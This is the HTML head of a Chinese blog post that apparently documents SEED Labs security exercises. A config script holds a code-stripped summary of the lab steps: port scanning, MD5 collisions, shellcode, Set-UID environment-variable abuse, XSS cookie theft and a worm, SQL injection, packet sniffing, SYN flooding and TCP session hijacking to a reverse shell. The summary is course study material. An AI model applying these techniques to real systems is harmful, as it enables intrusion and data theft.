<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SEED Labs 2.0 | Johnny</title><meta name="keywords" content="安全"><meta name="author" content="Johnny"><meta name="copyright" content="Johnny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SEED Labs 2.0"><meta name="application-name" content="SEED Labs 2.0"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SEED Labs 2.0"><meta property="og:url" content="https://jieyugit.github.io/2023/09/04/20231129-SEED-Labs-2.0/index.html"><meta property="og:site_name" content="Johnny"><meta property="og:description" content="端口扫描工具使用ICMP协议探测主机是否开启代码12345678def ping(host):    print(&amp;quot;Testing：&amp;quot;, host)    pkt &amp;#x3D; IP(dst&amp;#x3D;host) &amp;#x2F; ICMP() &amp;#x2F; b&amp;amp;#x27;I\&amp;amp;#x27;m a ping packet &amp;amp;"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129143832.png"><meta property="article:author" content="Johnny"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blog20231129143832.png"><meta name="description" content="端口扫描工具使用ICMP协议探测主机是否开启代码12345678def ping(host):    print(&amp;quot;Testing：&amp;quot;, host)    pkt &amp;#x3D; IP(dst&amp;#x3D;host) &amp;#x2F; ICMP() &amp;#x2F; b&amp;amp;#x27;I\&amp;amp;#x27;m a ping packet &amp;amp;"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://jieyugit.github.io/2023/09/04/20231129-SEED-Labs-2.0/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: undefined,
  postHeadAiDescription: undefined,
  diytitle: undefined,
  LA51: undefined,
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🔨 累死累活造轮子","🏃 脚踏实地行动派","🧱 团队小组发动机"]},
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Johnny","link":"链接: ","source":"来源: Johnny","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'Johnny',
  title: 'SEED Labs 2.0',
  postAI: '',
  pageFillDescription: '端口扫描工具, 使用ICMP协议探测主机是否开启, 代码, 结果, 半连接扫描, 代码, 结果, FIN, 代码, 结果, NULL, 代码, 结果, Xmas, 代码, 结果, FIN NULL Xmas存在的问题, MD5碰撞攻击实验, Task1, Question 1. If the length of your prefix file is not multiple of 64 what is going to happen?, Question 2. Create a prefix file with exactly 64 bytes and run the collision tool again and see what happens., Are the data (128 bytes) generated by md5collgen completely different for the two output files? Please identify all the bytes that are different., Task 2 Understanding MD5’s Property, Task 3 Generating Two Executable Files with the Same MD5 Hash, Task 4 Making the Two Programs Behave Differently, Shellcode Development Lab, Task 1.a The Entire Process, Compiling to object code., Linking to generate final binary., Getting the machine code, Using the shellcode in attacking code., Task 1.b. Eliminating Zeros from the Code, Task 1.c. Providing Arguments for System Calls, Task 1.d. Providing Environment Variables for execve(), Task 2 Using Code Segment, Task1, Task2, Task3, Environment Variable and Set-UID Program Lab, Task 1 Manipulating Environment Variables, Task 2 Passing Environment Variables from Parent Process to Child Process, Step1, Step2, Step3, Task 3 Environment Variables and execve(), Step1, Step2, Step3, Task 4 Environment Variables and system(), Task 5 Environment Variable and Set-UID Programs, Step1 编写程序, Step2, Step3, Task 6 The PATH Environment Variable and Set-UID Programs, 运行任意编写的代码, getshell, Task 7 The LD PRELOAD Environment Variable and Set-UID Programs, Step1, Step2, Step3, Task 8 Invoking External Programs Using system() versus execve(), Step 1, Step2, Task 9 Capability Leaking, Cross-Site Scripting (XSS) Attack Lab, Task 1 Posting a Malicious Message to Display an Alert Window, Task 2 Posting a Malicious Message to Display Cookies, Task 3 Stealing Cookies from the Victim’s Machine, Task 4 Becoming the Victim’s Friend, Task 5 Modifying the Victim’s Profile, Task 6 Writing a Self-Propagating XSS Worm, Task 7 Defeating XSS Attacks Using CSP, SQL Injection Attack Lab, Task 1 Get Familiar with SQL Statements, Task 2 SQL Injection Attack on SELECT Statement, Task 2.1 SQL Injection Attack from webpage, Task 2.2 SQL Injection Attack from command line, Task 2.3 Append a new SQL statement., Task 3 SQL Injection Attack on UPDATE Statement, Task 3.1 Modify your own salary., Task 3.2 Modify other people’ salary., Task 3.3 Modify other people’ password., Task 4 Countermeasure — Prepared Statement, Packet Sniffing and Spoofing Lab, Lab Task Set 1 Using Scapy to Sniff and Spoof Packets, Task 1.1 Sniffing Packets, Task 1.1A, Task 1.1B, Task 1.2 Spoofing ICMP Packets, Task 1.3 Traceroute, Task 1.4 Sniffing and-then Spoofing, Lab Task Set 2 Writing Programs to Sniff and Spoof Packets, Task 2.1A Understanding How a Sniffer Works, Task 2.1B Writing Filters, Task 2.1C Sniffing Passwords., Task 2.2 Spoofing, Task 2.2A Write a spoofing program., Task 2.2B Spoof an ICMP Echo Request., Question 4. Can you set the IP packet length field to an arbitrary value regardless of how big the actual packet is?, Question 5. Using the raw socket programming do you have to calculate the checksum for the IP header?, Question 6. Why do you need the root privilege to run the programs that use raw sockets? Where does the program fail if executed without the root privilege?, Task 2.3 Sniff and then Spoof, TCPx2FIP Attack Lab, Task 1 SYN Flooding Attack, Task 1.1 Launching the Attack Using Python, Task 1.2 Launch the Attack Using C, Task 1.3 Enable the SYN Cookie Countermeasure, Task 2 TCP RST Attacks on telnet Connections, Task 3 TCP Session Hijacking, Task 4 Creating Reverse Shell using TCP Session Hijacking端口扫描工具使用协议探测主机是否开启代码接收一个回复包请求数据包它使用了库来构建网络数据包这部分代码创建了一个数据包其中参数设置为传递给函数的主机地址这是请求的目标主机地址这部分代码创建了一个包用于发送请求包含文本消息的字节序列结果对于开启的主机来说当接收到之后会进行响应但是对于关闭的主机则没有响应半连接扫描代码这一行代码创建了一个请求数据包这部分代码创建了一个数据包其中参数设置为传递给函数的目标主机的地址这部分代码创建了一个数据包其中参数设置为传递给函数的端口号参数设置为表示发送一个请求这一行代码使用库发送请求数据包到目标主机的指定端口并等待回复具体解释如下这个参数设置为表示显示详细的输出信息以便查看扫描进度这是一个条件语句用于检查接收到的数据包是否包含层如果数据包包含层这一行代码用于检查层中的标志是否为表示连接建立成功端口是开放的如果端口是开放的代码将打印出消息如果数据包不包含层或标志不是则表示端口不是开放的在这种情况下代码将打印出消息结果对于未开放的端口发送时包直接被丢弃对于开放的端口服务器将回复代码这一行代码创建了一个请求数据包具体解释如下这部分代码创建了一个数据包其中参数设置为传递给函数的目标主机的地址这部分代码创建了一个数据包其中参数设置为传递给函数的端口号参数设置为表示发送一个请求这一行代码使用库发送请求数据包到目标主机的指定端口并等待回复这是一个条件语句用于检查是否接收到了回复数据包如果没有接收到回复数据包说明端口是开放的因为没有收到响应如果接收到了回复数据包并且该数据包的标志为则表示端口是关闭的这一行代码用于显示接收到的回复数据包的详细信息包括和头部的信息最后代码打印出消息表示端口是关闭的结果代码检测指定主机的指定端口是否处于开放状态与之前的扫描和扫描不同扫描发送一个没有标志位的数据包因此不应该触发目标主机的任何特定响应这一行代码创建了一个请求数据包这部分代码创建了一个数据包其中参数设置为传递给函数的目标主机的地址这部分代码创建了一个数据包其中参数设置为传递给函数的端口号但参数设置为空字符串表示发送一个请求即没有设置任何标志位这一行代码使用库发送请求数据包到目标主机的指定端口并等待回复如果没有接收到回复数据包说明端口是开放的因为没有收到响应因为发送的是一个空的数据包如果接收到了回复数据包并且该数据包的标志为则表示端口是关闭的这一行代码用于显示接收到的回复数据包的详细信息包括和头部的信息最后代码打印出消息表示端口是关闭的结果代码这一行代码创建了一个请求数据包这部分代码创建了一个数据包其中参数设置为传递给函数的端口号而参数设置为表示发送一个请求即将和标志位都设置为这一行代码使用库发送请求数据包到目标主机的指定端口并等待回复这是一个条件语句用于检查是否接收到了回复数据包如果没有接收到回复数据包说明端口是开放的因为没有收到响应因为发送的是一个请求不符合正常的握手如果接收到了回复数据包并且该数据包的标志为则表示端口是关闭的最后代码打印出消息表示端口是关闭的结果存在的问题首先我使用对虚拟机的端口进行抓包以为例使用进行扫描命令为分别对开放端口和关闭的端口进行扫描发现确实发了一个只有置位的包但是服务器都没有响应之后我查看了的源码内核版本在进行实验的过程中使用直接对服务器进行连接初始状态为同时进行三个判断分别为再进行其他情况全部丢弃所以我认为是系统自动把非法的包给丢弃了碰撞攻击实验首先编写一个内容为的文件在末尾补创建了一个比特的文件生成的两个文件值还是相同的通过文件查看两个文件的二进制发现末尾没有继续添了构造出大小为生成两个文件值相同查看二进制文件发现两个文件只有五处不同向两个文件添加后缀之后的值还是相同的和指导文件里一样我们先使用填充数组之后通过查看二进制中数组数据的位置如下图从第再偏移个字符都是数组的区域取的倍数十进制再使用生成两个不同的前缀生成的大小为所以我们需要保留原始程序中之后的代码之后拼接上不同的头生成两个程序给程序添加权限执行之后的结果进行比较之后发现不一样但是值是一样的首先编写一个代码这个就是一个好的代码之后通过查看其对应的二进制找到数组对应的地方可以看到是从开始的取的倍数十进制生成两个前缀查看发现在处开始后面内容在此截取后部分内容把其中一个新前缀的后字符填充物字符填充物个字节截取出来数组的长度是所以还需要填充个字节给和数组两个数组相差字节不是字节因此需要在数组和数组之间插入个使用生成个字符串由于生成时会在末尾自动加上因此我们需要截取生成的文件开始拼接将汇编语言编译成为机器码将编译后的文件进行链接就生成了可执行文件运行之后可以看到是子进程运行的命令可以通过查看编译之后机器码也可以通过查看没有被高亮的机器码可以使用将机器码转换一个格式先看看的指令是然后当作结尾符由于不能使用就使用将填满到个字节因为是小端存储所以需要先左移再右移的方式将消除掉查看反汇编指令并没有成功运行我们一行一行进行解释这一行先使用异或将清零然后将压入栈用于字符串终止标志将两个字符串压入栈中因为寄存器是位所以都是正好可以压入的不用另外处理然后把这个字符串即的地址赋值给将空的压入栈中也是当作字符串的结尾使用接下来的两条指令都是为了将空格给创造出来然后将字符串压入栈中同时清空供之后直接使用同时将字符串的地址赋值给也是同样的将指令创造出来压入栈中同时把指令压入栈中这样的字符串就是然后将字符串地址赋值给这些寄存器都存储好了字符串的地址之后将这些寄存器按照参数先后顺序压入栈中就完成了对于每个字符串都像前一个实验那样将字符串压入栈中并且存储对应字符串的值按照文档顺序都压入栈中但是最后一个压入的一定是如果选用其他的寄存器会导致段错误编译执行定义一个标签弹出堆栈顶部的值将其存储到寄存器中这个值是标签后面的字符串的地址将寄存器的值清零通常用于清零寄存器中的临时数据将中的写入到加的地址处这是为了将字符串的结尾标志设置为终止符将的值写入到加的地址处实际上是将的地址存储在这个位置将写入到加的地址处用于表示命令参数列表的结束计算的地址将结果存储在中这将成为系统调用的第二个参数即参数数组的地址将寄存器的值清零通常用于清零寄存器中的临时数据将寄存器设置为这是系统调用的系统调用号触发中断从而调用系统调用以执行定义标签调用标签实际上执行了前面定义的子例程定义一个字符串其中包含要执行的命令以及一些填充字符这个字符串是命令后面的内容它将被用来设置寄存器以便执行命令通过修改内存中的字符串和寄存器来构造系统调用所需的参数然后触发系统调用来执行指定的命令从而成功执行程序他是将定义好的字符串即在中弹出并且存储到中同时将其之下的位置当作参数位置进行构造然后记录其起始位置通过中断并且调用函数进行的执行是我们构造的字符串通过指令可以获取该地址是占位符为了防止导致无法复制字符串这里使用作为占位符后面会用进行替换是我们要执行的命令一定要注意到字符串最后有个存储的地址因此指向存储的地址运行结果为注意到位和位的不同位系统调用系统调用是通过指令完成的系统调用的前三个参数分别存储在和寄存器中修改之后的文件为成功执行使用或者打印环境变量使用或者查看特定的环境变量使用命令添加环境变量使用删除环境变量比较简单编译文件并且将输出重定向到文件中将父进程的环境变量打印并输出到另一个文件中比较两个文件并没有输出说明两个文件没有差异即子进程完全继承了父进程的环境变量在文档的描述中说到并不会返回其运行的进程直接使用调用的进程的地址空间而且是覆盖了原来进程的地址空间提出一个问题新的进程是否自动继承了调用进程的环境变量编译文件运行它发现并没有输出更改第十二行代码编译运行发现打印出了环境变量发现在原来的程序中定义了一个外部变量并且在调用时传入了这个值他就是父进程中的环境变量在中也有说明不同于系统调用使用的其实是运行指定的命令编写代码并且运行发现它打印出了环境变量编写程序编译程序并且更改程序执行权限设置三个环境变量这些环境变量是设置在用户空间的从就可看出来之后运行上面写好的程序我们发现在父进程中设置的环境变量都已经进入了子进程的环境变量但是我们发现在子进程的环境变量中找不到环境变量用于指定查找共享库动态链接库时除了默认路径以外的其他路径可以被修改从而加载攻击者的恶意库为了使程序更加安全不受环境变量的影响运行时的链接器或加载器会忽略环境变量或许可以理解为链接器所拥有的一个保护机制当执行程序的进程与拥有者的进程不一致时链接器就会忽略掉环境变量所以在子进程的环境变量中找不到此环境变量先编写一个程序这个程序运行了指令并且使用的是相对路径我们编译运行结果如下发现他确实运行了指令更改为程序为了关闭保护程序我们将重链接到另外一个程序上运行任意编写的代码由于是使用的相对路径所以我们写一个名叫的程序放在当前目录下使用程序就能执行这个恶意程序编译这个程序将的运行根目录更改为我们当前的目录再运行一次命令发现已经成功运行了我们的恶意程序因为是直接运行目录下的所以我们将复制到当前目录下并且命名为则运行后就可以编写文件编译文件将环境变量的值改为当前目录下编译好的文件编译文件运行文件程序运行了我们在当前目录的文件因为被链接到了当前目录下的函数程序正常睡眠之后退出因为切换为另一个用户之后动态链接器会忽略环境变量切换为权限添加环境变量运行程序发现运行了我们写的程序因为调用和执行的两个用户是同一个所以可以使用环境变量将文件所有者更改为运行程序也是正常的运行了函数真实用户与拥有者用户一致子进程会继承用户下的环境变量并加入共享库执行设置的函数真实用户与拥有者用户不一致子进程不会继承用户下的环境变量执行原有的函数真实用户与拥有者用户一致子进程会继承用户下的环境变量并加入共享库执行设置的函数还是因为运行的环境和拥有者不一致导致环境变量被忽略转为一个程序使用用户创建一个文件并且使用用户不能删除这个文件可以正常运行程序我们执行命令发现成功删除更改程序编译之后赋予权限继续尝试中的方法发现并不能删除是因为会创建一个子进程然后子进程会调用一个新的程序而且因为是一个根程序所以在执行时会以权限执行删除文件的命令可以成功删除使用不可以成功删除不可写文件因为会执行一个新程序而不会调用新的程序所以将我们输入的参数仅仅当成一个字符串不会执行命令所以不能删除不可写文件给程序赋予权限使用权限创建文件运行代码写入该程序是有效用户并是程序有权利打开文件在执行了撤销权限后由于文件并没有关闭出现了权限泄露的问题该文件仍然具有权限因此能够继续执行写入内容登录的账号修改主页的信息嵌入脚本保存主页信息由于中标签有所以不能嵌入到中可以嵌入到中保存之后可以看到脚本运行成功如果是长的代码就需要调用远端的代码放到我们自己的服务器上通过使用标签进行引用就是把中的换为修改脚本发送到我们监听的端口使用进行监听保存之后访问主页之后发现请求报文被发送到远端的服务器了但用户视角并没有提示箭头所指部分就是值可以看到在文本模式下输入一个字符切换为之后就会看到已经把他转义了我们使用添加并且抓包看看请求的地址所以恶意代码完整为把代码插入使用访问的主页发现已经添加为好友了这两行是为了绕过服务器的验证不行代码被转义成文本内容不能当作脚本执行利用实现代码插入到主页中先看主页什么都没有再次访问的主页发现主页已经被添加了一句话这行代码是为了防止攻击者自身的主页被篡改导致攻击失败编辑使得可以把自己赋值到别人的中访问主页后发现主页信息已经被修改使用访问的主页发现也被修改都显示的几个网站都是表示都添加到白名单之中只有从和自己才被信任只有从自己和才被信任只有执行成功添加了一个信任的站点的机制只会执行信任站点的代码查看文档的源码可以看到语句是进行拼接的所以存在注入并且如果有返回就直接显示对应用户的信息所以我们只用保持这个语句能正常执行并且返回记录构造如下密码随意因为会被注释掉成功由于是请求需要进行转码打开在线工具直接进行转码注入成功题目让我们使用分开两条语句我们尝试修改的工资为修改前构造语句但是注入失败可以看到源码是进行字符串拼接来构造语句的所以我们可以使用和上一个任务类似的方式添加一条修改语句构造如下我们选在在之后添加利用成功修改别人的工资只需要将条件修改即可修改前修改后查看源代码他会自动给我们将密码进行存储同时字段后面还有字段所以我们在输入框进行注释就正常填入我们想要修改的密码进行如下构造虽然提示但是查看数据库还是修改成功登录用户看看可以使用我们的密码进行登录安全页面上我们使用之前的方法还是可以进行注入我们现在就修改的工作流来修复漏洞可以看到攻击失败使用查看网卡名修改使用身份运行命令当切换为普通用户权限时发现无法进行操作我们写一个发包脚本运行这两个发现成功运行自己设定的源地址和目的地址可以看到正常发送以及正常回显在中编写如下代码当嗅探到有的数据包时返回给发送数据包的主机一个响应发现无论什么地址都能获得响应同时从欺骗工具来看是发送的响应完成如下的命令发现不存在的地址是不会返回响应的编写代码通过来测试通过程序来捕获的数据包然后通过指针来对数据包的不同位置头头等进行处理因为程序需要挂载到内核中去属于特权操作使用混杂模式可以监听所在网段下其他机器的数据包关闭则不能更改规则和网卡名称使用的容器内部去能获取改变过滤规则编写嗅探工具嗅探端口以此类推可以得到密码从源地址向目标地址的端口发送消息不可以不用计算头部的因为能任意读取发送包意味着很大的安全风险所以需要权限代码如下运行使用另一台机器此机器运行上面的程序结果如下查看队列长度编写攻击程序登录进入受害机执行都为正常执行命令再次查看主机的连接发现大量的攻击源而且地址随机编译提供好的程序进行攻击先查看受害机的连接进行攻击打开进行攻击还是有着大量的攻击编写一个嗅探和攻击的程序使用连接当发送了一个包给时就会收到一个的包导致连接关闭编写攻击程序连接的终端运行程序发现攻击成功查看文件是否存在以及内容编写劫持程序在端口监听上的连接使用连接运行劫持程序发现已经',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2023-11-29 00:00:00',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Johnny</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/C/" style="font-size: 1.05rem;">C<sup>1</sup></a><a href="/tags/Golang/" style="font-size: 1.05rem;">Golang<sup>1</sup></a><a href="/tags/Java/" style="font-size: 1.05rem;">Java<sup>4</sup></a><a href="/tags/Nginx/" style="font-size: 1.05rem;">Nginx<sup>1</sup></a><a href="/tags/Spring-Cloud/" style="font-size: 1.05rem;">Spring Cloud<sup>3</sup></a><a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">安全<sup>5</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/12/"><span class="card-archive-list-date">十二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">十二月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/01/"><span class="card-archive-list-date">一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/08/"><span class="card-archive-list-date">八月 2022</span><div 